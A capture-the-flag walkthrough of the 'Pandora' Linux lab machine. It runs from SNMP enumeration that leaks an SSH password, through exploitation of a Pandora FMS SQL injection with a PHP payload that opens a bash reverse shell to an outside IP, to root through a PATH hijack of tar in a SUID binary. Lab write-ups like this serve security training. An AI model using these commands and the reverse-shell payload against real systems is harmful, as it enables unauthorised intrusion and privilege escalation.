# Pandora
**OS**: Linux
**Difficulty**: Easy

## Enumeration:
I'll start with a port scan.
```bash
nmap -sC -p- 10.129.19.198

22/tcp open  ssh
| ssh-hostkey: 
|   3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 (RSA)
|   256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 (ECDSA)
|_  256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 (ED25519)
80/tcp open  http
|_http-title: Play | Landing
```

I'll start by taking a look at the HTTP server.

![img1](images/img_00001.png)

We can see a domain is mentioned. I'll add it to my hosts file.

I'll also run an UDP port scan.
```bash
sudo nmap -sU panda.htb

PORT    STATE SERVICE
161/udp open  snmp
```

I'll use snmpwalk to enumerate this port.
```bash
snmpwalk -v 2c -c public panda.htb >snmp.output
```

## Foothold:
Examining the strings, I found some credentials.
```bash
iso.3.6.1.2.1.25.4.2.1.5.1145 = STRING: "-u daniel -p HotelBabylon23"
```

I'll use those for the ssh service.
```bash
ssh daniel@panda.htb 
HotelBabylon23
```

There is another user on the target, called matt.

After some enumeration I found out about the pandora.panda.htb vhost in "/etc/apache2/sites-available/pandora.conf"
```
<VirtualHost localhost:80>
  ServerAdmin admin@panda.htb
  ServerName pandora.panda.htb
  DocumentRoot /var/www/pandora
  AssignUserID matt matt
  <Directory /var/www/pandora>
    AllowOverride All
  </Directory>
  ErrorLog /var/log/apache2/error.log
  CustomLog /var/log/apache2/access.log combined
</VirtualHost>
```

Port forwarding:
```bash
ssh -L 8000:localhost:80 daniel@pandora.htb
```

And now we can access the console.

![img2](images/img_00000.png)

## Lateral Movement: 
We can search for the version of pandora FMS. This reveals several vulnerabilities. I found a [POC](https://github.com/shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticated/blob/master/sqlpwn.py) that exploits an SQL injection and FILE Upload vulnerability that leads to an RCE.

```bash
python3 sqlpwn.py -t pandora.panda.htb:8000 
```

I also modified the command being executed to:
```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.111/6666 0>&1'");
```

And now we have a shell as the user Matt.

## Privilege Escalation:

Running "sudo -l" reveals something interesting.
```bash
/usr/bin/sudo -l
sudo: PERM_ROOT: setresuid(0, -1, -1): Operation not permitted
sudo: unable to initialize policy plugin
```

There is a policy plugin used on the system. Running "ls /etc/apparmor.d/*" confirms the existence of AppArmor on the target.

Further enumeration reveals that "/usr/bin/pandora_backup" has the SUID flag set.
```bash
find / -perm -u=s -type f 2>/dev/null  

/usr/bin/pandora_backup
```

After transferring the file on my machine I used strings on the binary. And got something interesting.
```bash
PandoraFMS Backup Utility                                                                                                                         
Now attempting to backup PandoraFMS client                                                                                                        
tar -cvf /root/.backup/pandora-backup.tar.gz /var/www/pandora/pandora_console/*  
```

So it's most likely a command execution. We can see there is a PATH injection vulnerability.
So we can replace the tar binary with a bash binary. 
```bash
echo "/bin/bash" > /var/tmp/tar
chmod +x /var/tmp/tar
export PATH=/var/tmp:$PATH
/usr/bin/pandora_backup


root@pandora:~# id
uid=0(root) gid=1000(matt) groups=1000(matt)
```